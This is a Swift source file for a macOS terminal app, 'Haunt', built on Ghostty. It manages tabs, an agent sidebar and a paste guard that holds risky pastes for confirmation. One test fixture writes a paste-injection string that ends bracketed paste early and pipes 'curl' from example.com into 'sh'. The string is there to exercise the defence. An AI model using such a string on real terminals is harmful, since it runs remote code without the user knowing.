import AppKit
import Combine
import GhosttyKit

/// Our surface: it reports every user write path into the pty, so the core can retire a request the user
/// may already have answered at the terminal. A subclass, so the vendored Ghostty sources stay unpatched;
/// Ghostty's own bindings that it handles in performKeyEquivalent also arrive here through keyDown.
/// libghostty has no single write choke point the app can hook, so each entry is overridden; see docs/core-api.md.
final class HauntSurfaceView: Ghostty.SurfaceView {
    var onInput: (() -> Void)?
    /// A paste that Ghostty's paste protection holds for confirmation; nil when it resolves or is replaced.
    var onPasteConfirmation: ((Ghostty.ClipboardConfirmationRequest?) -> Void)?
    /// A paste Haunt holds itself (PastePreview.needsConfirmation); the host asks, then calls `sendPaste`.
    var onRiskyPaste: ((String) -> Void)?

    /// True when `text` was held for confirmation instead of going to Ghostty.
    private func holdIfRisky(_ text: String?) -> Bool {
        guard let text, let ask = onRiskyPaste, PastePreview(text).needsConfirmation else { return false }
        ask(text)
        return true
    }

    /// Writes a paste the user confirmed, encoded as Ghostty pastes: ESC and other controls become spaces,
    /// and LF becomes CR outside a bracketed paste.
    func sendPaste(_ text: String) {
        onInput?()
        surfaceModel?.sendText(text)
    }

    override func keyDown(with event: NSEvent) {
        onInput?()
        super.keyDown(with: event)
    }

    override func paste(_ sender: Any?) {
        onInput?()
        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
        super.paste(sender)
    }

    override func pasteAsPlainText(_ sender: Any?) {
        onInput?()
        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
        super.pasteAsPlainText(sender)
    }

    override func pasteSelection(_ sender: Any?) {
        onInput?()
        if holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents()) { return }
        super.pasteSelection(sender)
    }

    /// IME commits, the Character Viewer and dictation can insert text without a keyDown.
    override func insertText(_ string: Any, replacementRange: NSRange) {
        onInput?()
        super.insertText(string, replacementRange: replacementRange)
    }

    /// Middle click pastes the selection clipboard.
    private var middleHeld = false

    override func otherMouseDown(with event: NSEvent) {
        if event.buttonNumber == 2 {
            onInput?()
            middleHeld = holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents())
            if middleHeld { return }
        }
        super.otherMouseDown(with: event)
    }

    override func otherMouseUp(with event: NSEvent) {
        // A press held back with its paste keeps its release too.
        if event.buttonNumber == 2, middleHeld {
            middleHeld = false
            return
        }
        super.otherMouseUp(with: event)
    }

    override func performDragOperation(_ sender: any NSDraggingInfo) -> Bool {
        onInput?()
        if holdIfRisky(sender.draggingPasteboard.getOpinionatedStringContents()) { return true }
        return super.performDragOperation(sender)
    }

    /// Services such as "Send to Terminal" write the pasteboard straight into the pty.
    override func readSelection(from pboard: NSPasteboard) -> Bool {
        onInput?()
        if holdIfRisky(pboard.getOpinionatedStringContents()) { return true }
        return super.readSelection(from: pboard)
    }

    /// A confirmed paste writes when its request resolves, possibly long after the paste action itself.
    /// The request's outcome is private, so retire on every resolution, including a cancel.
    override var pendingClipboardConfirmation: Ghostty.ClipboardConfirmationRequest? {
        didSet {
            guard oldValue !== pendingClipboardConfirmation else { return }
            if let old = oldValue, old.kind == .paste { onInput?() }
            let new = pendingClipboardConfirmation
            onPasteConfirmation?(new?.kind == .paste ? new : nil)
        }
    }
}

/// Lays out title bar, sidebar and pane at fixed mockup sizes; without the sidebar, mockup 10's.
private final class RootView: NSView {
    let titleBar = TitleBarView()
    let sidebar = SidebarView()
    let pane = NSView()
    /// The palette mockup's scrim over everything below the title bar.
    let scrim = NSView()
    let agents = AgentsView()

    var sidebarHidden = false {
        didSet {
            titleBar.zen = sidebarHidden
            sidebar.isHidden = sidebarHidden || agentsOn
            needsLayout = true
        }
    }

    /// The agents-only view covers the window; the panes keep their last frames so no terminal resizes.
    var agentsOn = false {
        didSet {
            agents.isHidden = !agentsOn
            titleBar.isHidden = agentsOn
            pane.isHidden = agentsOn
            sidebar.isHidden = agentsOn || sidebarHidden
            needsLayout = true
        }
    }

    override var isFlipped: Bool { true }

    override init(frame: NSRect) {
        super.init(frame: frame)
        pane.wantsLayer = true
        pane.layer?.backgroundColor = Tok.Color.windowBg.cgColor
        scrim.wantsLayer = true
        scrim.layer?.backgroundColor = NSColor(white: 0, alpha: Tok.Size.paletteScrimAlpha).cgColor
        scrim.isHidden = true
        agents.isHidden = true
        for v in [titleBar, sidebar, pane, scrim, agents] { addSubview(v) }
    }

    required init?(coder: NSCoder) { fatalError() }

    override func layout() {
        super.layout()
        agents.frame = bounds
        if agentsOn { return }
        let top = TitleBarView.height(zen: sidebarHidden), w = sidebarHidden ? 0 : Tok.Size.sidebarW
        titleBar.frame = NSRect(x: 0, y: 0, width: bounds.width, height: top)
        sidebar.frame = NSRect(x: 0, y: top, width: Tok.Size.sidebarW, height: bounds.height - top)
        pane.frame = NSRect(x: w, y: top, width: bounds.width - w, height: bounds.height - top)
        scrim.frame = NSRect(x: 0, y: top, width: bounds.width, height: bounds.height - top)
    }
}

final class MainWindowController: NSWindowController, NSWindowDelegate {
    private let core: CoreAPI
    private let ghostty: Ghostty.App
    private let fixture: Fixture?
    /// The mockups' window size in points.
    private static let defaultSize = NSSize(width: 900, height: Tok.Size.windowH)
    private let config: HauntConfig
    private let store = TabStore()
    private let bridge: PluginBridge
    private lazy var pasteGuard = PasteGuard(window: window) { [weak self] view in
        guard let self, let tab = self.store.tab(for: view), tab.env.surfaceId != self.store.selectedId else { return }
        self.select(tab.env.surfaceId)
    }
    /// Set once the core has started, so the decision log is loaded before plugins read it.
    var plugins: PluginsAPI? {
        get { bridge.plugins }
        set { bridge.plugins = newValue }
    }
    private lazy var palette: PaletteController = {
        let p = PaletteController(host: self)
        p.sticky = fixture != nil
        return p
    }()
    private let root = RootView()
    var tabs: [Tab] { store.tabs }
    private var refreshQueued = false
    private var observers: [NSObjectProtocol] = []
    private var ticker: Timer?
    /// Applied in showWindow, once the window has its launch position to restore to.
    private var agentsViewAtLaunch = false
    private lazy var listener = MainQueueListener { [weak self] in self?.coalescedRefresh() }

    init(core: CoreAPI, ghostty: Ghostty.App, fixture: Fixture?, config: HauntConfig) {
        self.core = core
        self.ghostty = ghostty
        self.fixture = fixture
        self.config = config
        bridge = PluginBridge(core: core) { [store] bytes, id in store.write(bytes, to: id) }
        let size = Self.defaultSize
        let win = NSWindow(contentRect: NSRect(origin: .zero, size: size),
                           styleMask: [.titled, .closable, .miniaturizable, .resizable, .fullSizeContentView],
                           backing: .buffered, defer: false)
        // Hidden in the title bar; still names the window in the Window menu and to accessibility.
        win.title = "Haunt"
        win.titleVisibility = .hidden
        win.titlebarAppearsTransparent = true
        win.colorSpace = .sRGB
        win.appearance = NSAppearance(named: .darkAqua)
        win.backgroundColor = Tok.Color.windowBg
        win.minSize = NSSize(width: Tok.Size.sidebarW + 300, height: 240)
        win.tabbingMode = .disallowed
        for b in [NSWindow.ButtonType.closeButton, .miniaturizeButton, .zoomButton] {
            win.standardWindowButton(b)?.isHidden = true
        }
        win.contentView = root
        super.init(window: win)
        win.delegate = self

        root.titleBar.accessory = fixture?.titleAccessory ?? .icons
        root.titleBar.onIcon = { [weak self] icon in self?.titleIcon(icon) }
        root.titleBar.onHint = { [weak self] hint in
            switch hint {
            case .agents: self?.toggleSidebar()
            case .search: self?.togglePalette()
            }
        }
        // Fixtures neither read nor overwrite the user's saved state.
        root.sidebarHidden = fixture?.sidebarHidden ?? config.state.sidebarHidden
        agentsViewAtLaunch = fixture?.agentsView ?? config.state.agentsView
        updateKeys(config.keys)
        root.titleBar.buttons = fixture?.titlebarButtons ?? config.titlebarButtons
        root.sidebar.onSelect = { [weak self] id in self?.select(id) }
        root.sidebar.onClose = { [weak self] id in self?.closeTab(id) }
        root.agents.list.onSelect = { [weak self] id in self?.expandAgentsView(to: id) }
        root.agents.list.onClose = { [weak self] id in self?.closeTab(id) }
        root.sidebar.onRename = { [weak self] id, name in
            self?.store.customNames[id] = name.isEmpty ? nil : name
            self?.refresh()
        }
        root.sidebar.onRenameEnd = { [weak self] in self?.focusSelectedSurface() }
        root.sidebar.rowMenu = { [weak self] id in self?.plugins?.rowMenuItems(surfaceId: id) ?? [] }
        root.sidebar.onRowMenu = { [weak self] item, id in self?.bridge.invokeRowMenu(item, surfaceId: id) }
        root.sidebar.onRowMoved = { [weak self] id, group, before in
            self?.plugins?.rowMoved(surfaceId: id, groupId: group, beforeSurfaceId: before)
        }
        core.setListener(listener: listener)

        let nc = NotificationCenter.default
        observers.append(nc.addObserver(forName: Ghostty.Notification.ghosttyCloseSurface, object: nil, queue: .main) { [weak self] n in
            guard let view = n.object as? Ghostty.SurfaceView else { return }
            self?.surfaceWantsClose(view, processAlive: n.userInfo?["process_alive"] as? Bool ?? false)
        })
    }

    required init?(coder: NSCoder) { fatalError() }

    func tab(for view: Ghostty.SurfaceView) -> Tab? { store.tab(for: view) }

    // MARK: Tabs

    func newTab(cwd: String? = nil, select selectIt: Bool = true) {
        guard let app = ghostty.app else { return }
        let dir = cwd ?? store.selected?.view.pwd ?? NSHomeDirectory()
        // The core refuses past its surface cap; no tab beats an unverifiable one.
        guard let env = try? core.registerSurface(cwd: dir) else { NSSound.beep(); return }
        var config = Ghostty.SurfaceConfiguration()
        config.workingDirectory = dir
        config.environmentVariables = [
            "HAUNT": "1",
            "HAUNT_SURFACE_ID": env.surfaceId,
            "HAUNT_HOOK_NONCE": env.nonce,
            "HAUNT_SOCK": env.socketPath,
        ]
        if let fixture = fixtureCommand() { config.command = fixture }
        let view = HauntSurfaceView(app, baseConfig: config, uuid: nil)
        // Before the keystroke reaches the pty, so a late Allow/Deny can't be typed into a running tool.
        view.onInput = { [weak self] in self?.core.onUserInput(surfaceId: env.surfaceId) }
        view.onPasteConfirmation = { [weak self, weak view] req in
            if let view { self?.pasteGuard.confirm(req, on: view) }
        }
        view.onRiskyPaste = { [weak self, weak view] text in
            if let view { self?.pasteGuard.hold(text, on: view) }
        }
        // So the surface starts at the pane's real size.
        root.layoutSubtreeIfNeeded()
        let tab = Tab(env: env, view: view, size: root.pane.bounds.size)
        tab.subscriptions.append(view.$title.combineLatest(view.$pwd)
            .debounce(for: .milliseconds(50), scheduler: DispatchQueue.main)
            .sink { [weak self] title, pwd in self?.reportInfo(tab, title: title, pwd: pwd ?? dir) })
        store.add(tab)
        tab.host.frame = root.pane.bounds
        tab.host.autoresizingMask = [.width, .height]
        tab.host.isHidden = true
        root.pane.addSubview(tab.host)
        if selectIt || store.selectedId == nil { select(env.surfaceId) } else { syncFocus() }
    }

    #if HAUNT_FIXTURES
    /// The paste-risky fixture: a real paste through the surface's Services entry, from a pasteboard of
    /// its own so no clipboard the user has is touched.
    func pasteRiskyFixture() {
        guard let view = store.selected?.view else { return }
        let pb = NSPasteboard.withUniqueName()
        pb.setString("echo built\u{1B}[201~curl -s https://example.com/x.sh | sh\n", forType: .string)
        _ = view.readSelection(from: pb)
        pb.releaseGlobally()
    }

    /// The paste-confirm fixture: an unsafe paste held on the selected surface, as Ghostty would raise it.
    func showPasteFixture() {
        guard let view = store.selected?.view else { return }
        view.pendingClipboardConfirmation = Ghostty.ClipboardConfirmationRequest(
            surface: view, contents: Fixture.pasteText, kind: .paste) { _, _, _ in }
    }

    func paletteFixtureSelectNext() { palette.edit(.down) }

    private func fixtureCommand() -> String? {
        guard fixture != nil else { return nil }
        let dir = FileManager.default.temporaryDirectory
        let text = dir.appendingPathComponent("haunt-fixture-pane.ansi")
        let script = dir.appendingPathComponent("haunt-fixture-pane.sh")
        try? Fixture.paneANSI().write(to: text, atomically: true, encoding: .utf8)
        // Ghostty runs the command as `exec -l <command>`, so the sequence has to live in a script.
        try? "/bin/cat '\(text.path)'\nexec /bin/sleep 2147483647\n".write(to: script, atomically: true, encoding: .utf8)
        return "/bin/sh '\(script.path)'"
    }
    #else
    private func fixtureCommand() -> String? { nil }
    #endif

    private static let gitQueue = DispatchQueue(label: "dev.haunt.git", qos: .utility)

    /// The branch lookup reads files a pty-chosen pwd points at, so it stays off the main thread.
    private func reportInfo(_ tab: Tab, title: String, pwd: String) {
        tab.infoGeneration += 1
        let gen = tab.infoGeneration
        Self.gitQueue.async { [weak self, weak tab] in
            let branch = Git.branch(at: pwd)
            DispatchQueue.main.async {
                guard let self, let tab, tab.infoGeneration == gen else { return }
                self.core.setSurfaceInfo(surfaceId: tab.env.surfaceId, title: title, cwd: pwd, gitBranch: branch)
            }
        }
    }

    func select(_ id: String) {
        guard let tab = store.tab(id) else { return }
        store.selectedId = id
        core.selectSurface(surfaceId: id)
        // Every surface stays in the window (hidden when not selected) so its size and display stay current.
        for t in store.tabs { t.host.isHidden = t !== tab }
        window?.makeFirstResponder(root.agentsOn ? root.agents : tab.view)
        syncFocus()
    }

    /// Like Ghostty's own controller: only the selected surface of the key window has focus. Ghostty learns
    /// the display only on screen changes, so it is told up front for its vsync display link.
    /// Only the selected surface of a visible window renders; the rest are occluded.
    private func syncFocus() {
        let key = window?.isKeyWindow ?? false
        let display = window?.screen?.displayID
        let paneShown = (window?.occlusionState.contains(.visible) ?? false) && !root.agentsOn
        for t in store.tabs {
            let selected = t.env.surfaceId == store.selectedId
            t.view.focusDidChange(key && selected && t.view.isFirstResponder)
            guard let surface = t.view.surface else { continue }
            ghostty_surface_set_occlusion(surface, paneShown && selected)
            if let display { ghostty_surface_set_display_id(surface, display) }
            if selected { ghostty_surface_refresh(surface) }
        }
    }

    /// ⌘1–9 follow the sidebar's display order.
    func select(index: Int) {
        let ids = root.sidebar.orderedIds
        if ids.indices.contains(index) { select(ids[index]) }
    }

    /// Next (+1) or previous (-1) tab in sidebar order, wrapping around.
    func selectAdjacent(_ step: Int) {
        let ids = root.sidebar.orderedIds
        guard !ids.isEmpty else { return }
        let i = store.selectedId.flatMap(ids.firstIndex(of:)) ?? 0
        select(ids[((i + step) % ids.count + ids.count) % ids.count])
    }

    func closeSelectedTab() {
        if let id = store.selectedId { closeTab(id) }
    }

    /// Like ⌘W on that tab: Ghostty asks for confirmation when a process is running.
    func closeTab(_ id: String) {
        guard let surface = store.tab(id)?.view.surface else { return }
        ghostty.requestClose(surface: surface)
    }

    private func surfaceWantsClose(_ view: Ghostty.SurfaceView, processAlive: Bool) {
        guard let tab = tab(for: view), let window else { return }
        guard processAlive else { return remove(tab) }
        let alert = NSAlert()
        alert.messageText = "Close this tab?"
        alert.informativeText = "A process is still running in it."
        alert.addButton(withTitle: "Close")
        alert.addButton(withTitle: "Cancel")
        alert.beginSheetModal(for: window) { [weak self] r in
            if r == .alertFirstButtonReturn { self?.remove(tab) }
        }
    }

    private func remove(_ tab: Tab) {
        guard store.tabs.contains(where: { $0 === tab }) else { return }
        let order = root.sidebar.orderedIds
        let pos = order.firstIndex(of: tab.env.surfaceId)
        tab.subscriptions.removeAll()
        tab.host.removeFromSuperview()
        store.remove(tab)
        core.unregisterSurface(surfaceId: tab.env.surfaceId)
        guard let first = store.tabs.first else {
            window?.close()
            return
        }
        if store.selectedId == tab.env.surfaceId {
            let rest = order.filter { $0 != tab.env.surfaceId }
            let next = pos.map { rest[min($0, rest.count - 1)] } ?? first.env.surfaceId
            select(next)
        }
        refresh()
    }

    // MARK: Core

    /// A burst of hook events becomes one redraw.
    private func coalescedRefresh() {
        guard !refreshQueued else { return }
        refreshQueued = true
        DispatchQueue.main.async { [weak self] in
            self?.refreshQueued = false
            self?.refresh()
            self?.bridge.drain()
        }
    }

    /// Subagent elapsed times are computed in snapshot(), so poll once a second to keep them ticking,
    /// but only while the window can be seen; becoming visible again catches up at once.
    private func updateTicker() {
        let visible = window?.occlusionState.contains(.visible) ?? false
        guard visible != (ticker != nil) else { return }
        ticker?.invalidate()
        ticker = nil
        guard visible else { return }
        refresh()
        let t = Timer(timeInterval: 1, repeats: true) { [weak self] _ in
            self?.refresh()
            self?.bridge.drain()
        }
        t.tolerance = 0.2
        RunLoop.main.add(t, forMode: .common)
        ticker = t
    }

    func refresh() {
        let snap = store.named(core.snapshot())
        if snap != root.sidebar.snapshot { root.sidebar.snapshot = snap }
        if root.agentsOn { root.agents.update(snap) }
        let sel = snap.groups.lazy.flatMap(\.rows).first { $0.selected }
        root.titleBar.progress = sel?.progress.map { $0.total == 0 ? 0 : CGFloat($0.done) / CGFloat($0.total) }
    }

    // MARK: Sidebar, palette, keys

    var isSidebarHidden: Bool { root.sidebarHidden }

    var onSidebarToggle: (() -> Void)?

    var isRenaming: Bool { root.sidebar.isRenaming }

    func renameSelectedTab(text: String? = nil) {
        guard let id = store.selectedId else { return }
        if root.sidebarHidden { toggleSidebar() }
        root.sidebar.beginRename(id, text: text)
    }

    func setCustomName(_ name: String, at index: Int) {
        let ids = root.sidebar.orderedIds
        guard ids.indices.contains(index) else { return }
        store.customNames[ids[index]] = name
        refresh()
    }

    func toggleSidebar() {
        root.sidebarHidden.toggle()
        onSidebarToggle?()
        root.layoutSubtreeIfNeeded()
        if fixture == nil { config.updateState { $0.sidebarHidden = root.sidebarHidden } }
    }

    /// The zen hint and anything else that shows a shortcut follow the `[keys]` table.
    func updateKeys(_ keys: KeyMap) {
        func hint(_ a: KeyMap.Action, _ word: String) -> String {
            keys[a].map { "\($0.display) \(word)" } ?? word
        }
        root.titleBar.hints = [(.agents, hint(.toggleSidebar, "agents")), (.search, hint(.palette, "search"))]
        root.titleBar.shortcuts = Dictionary(uniqueKeysWithValues: TitlebarButton.allCases.compactMap { b in keys[b.action].map { (b, $0.display) } })
        root.agents.shortcut = AgentsView.mockupDisplay(keys[.agentsView])
    }

    func updateTitlebarButtons(_ buttons: [TitlebarButton]) {
        root.titleBar.buttons = buttons
    }

    func togglePalette() {
        if palette.isOpen { return palette.close() }
        // The 400 pt palette doesn't fit the 278 pt strip.
        if root.agentsOn { return NSSound.beep() }
        openPalette()
    }

    func openPalette(text: String = "") {
        guard let window else { return }
        root.scrim.isHidden = false
        palette.open(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop, text: text)
    }

    /// The core keeps running without its socket; agent rows then only get OSC status.
    func showStartError(_ error: Error) {
        guard let window else { return }
        let alert = NSAlert()
        alert.messageText = "Haunt can't receive agent events"
        alert.informativeText = "The hook socket didn't start: \(error). Agent rows will only show basic status."
        alert.beginSheetModal(for: window)
    }

    /// Plugin requests waiting since the last core event; the app delegate drains once at launch.
    func drainPluginRequests() { bridge.drain() }

    // MARK: Title bar

    private func titleIcon(_ icon: TitleBarView.Icon) {
        switch icon {
        case .search: togglePalette()
        case .newTab: newTab()
        case .settings: (NSApp.delegate as? AppDelegate)?.openSettings(nil)
        case .sidebar: toggleSidebar()
        }
    }

    // MARK: Agents-only view

    var isAgentsViewOn: Bool { root.agentsOn }

    override func showWindow(_ sender: Any?) {
        if agentsViewAtLaunch {
            agentsViewAtLaunch = false
            setAgentsView(true, animate: false)
        }
        super.showWindow(sender)
    }

    func toggleAgentsView() {
        setAgentsView(!root.agentsOn, animate: true)
        if fixture == nil { config.updateState { $0.agentsView = root.agentsOn } }
    }

    /// A row click: the full window comes back on that tab.
    private func expandAgentsView(to id: String) {
        if root.agentsOn { toggleAgentsView() }
        select(id)
    }

    private func setAgentsView(_ on: Bool, animate: Bool) {
        guard let window, on != root.agentsOn else { return }
        if window.styleMask.contains(.fullScreen) { return NSSound.beep() }
        if on {
            if palette.isOpen { palette.close() }
            root.agents.restore = (window.frame, window.minSize)
            root.agentsOn = true
            // The strip neither zooms nor goes full screen (windowShouldZoom), whatever asks.
            window.collectionBehavior.insert(.fullScreenNone)
            refresh()
            window.minSize = NSSize(width: Tok.Size.narrowW - 2, height: 200)
            let frame = AgentsView.dockedFrame(on: window.screen ?? NSScreen.main, height: fixture == nil ? nil : Fixture.narrowHeight)
            window.setFrame(frame, display: true, animate: animate)
            window.makeFirstResponder(root.agents)
        } else {
            // Grow first, then lay the panes out once at their full size.
            window.collectionBehavior.remove(.fullScreenNone)
            if let r = root.agents.restore {
                let frame = AgentsView.restoredFrame(r.frame, screens: NSScreen.screens.map(\.visibleFrame),
                                                     current: (window.screen ?? NSScreen.main)?.visibleFrame)
                window.setFrame(frame, display: true, animate: animate)
                window.minSize = r.minSize
            }
            root.agents.restore = nil
            root.agentsOn = false
            root.layoutSubtreeIfNeeded()
            if let tab = store.selected { window.makeFirstResponder(tab.view) }
        }
        syncFocus()
    }

    // MARK: NSWindowDelegate

    func windowShouldClose(_ sender: NSWindow) -> Bool {
        guard ghostty.needsConfirmQuit else { return true }
        let alert = NSAlert()
        alert.messageText = "Close the window?"
        alert.informativeText = "Processes are still running in its tabs."
        alert.addButton(withTitle: "Close")
        alert.addButton(withTitle: "Cancel")
        alert.beginSheetModal(for: sender) { r in
            if r == .alertFirstButtonReturn { sender.close() }
        }
        return false
    }

    func windowShouldZoom(_ window: NSWindow, toFrame newFrame: NSRect) -> Bool { !root.agentsOn }

    func windowDidBecomeKey(_ notification: Notification) { syncFocus() }
    func windowDidResignKey(_ notification: Notification) { syncFocus() }
    func windowDidChangeScreen(_ notification: Notification) { syncFocus() }
    func windowDidChangeOcclusionState(_ notification: Notification) {
        updateTicker()
        syncFocus()
    }

    func windowDidResize(_ notification: Notification) {
        guard palette.isOpen, let window else { return }
        palette.position(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop)
    }

    func windowWillClose(_ notification: Notification) {
        ticker?.invalidate()
        ticker = nil
        for t in store.tabs { core.unregisterSurface(surfaceId: t.env.surfaceId) }
        store.removeAll()
    }
}

extension MainWindowController: PaletteHost {
    var paletteTabs: [Row] {
        let order = root.sidebar.orderedIds
        let rows = Dictionary(root.sidebar.snapshot.groups.flatMap(\.rows).map { ($0.surfaceId, $0) }, uniquingKeysWith: { a, _ in a })
        return order.compactMap { rows[$0] }
    }

    var selectedSurfaceId: String? { store.selectedId }

    var palettePlugins: PluginsAPI? { bridge.plugins }

    var pluginLoadErrors: [String] { bridge.loadErrors }

    func paletteSelectTab(_ surfaceId: String) { select(surfaceId) }

    func paletteInvoke(pluginId: String, itemId: String) { bridge.invoke(pluginId: pluginId, itemId: itemId) }

    var paletteKeys: KeyMap { config.keys }

    var isFullScreen: Bool { window?.styleMask.contains(.fullScreen) ?? false }

    func paletteRun(_ action: KeyMap.Action) { (NSApp.delegate as? AppDelegate)?.performMenuItem(action) }

    func paletteDidClose() {
        root.scrim.isHidden = true
        window?.makeKeyAndOrderFront(nil)
        focusSelectedSurface()
    }

    private func focusSelectedSurface() {
        guard let window else { return }
        if let tab = store.selected { window.makeFirstResponder(tab.view) }
        syncFocus()
    }
}
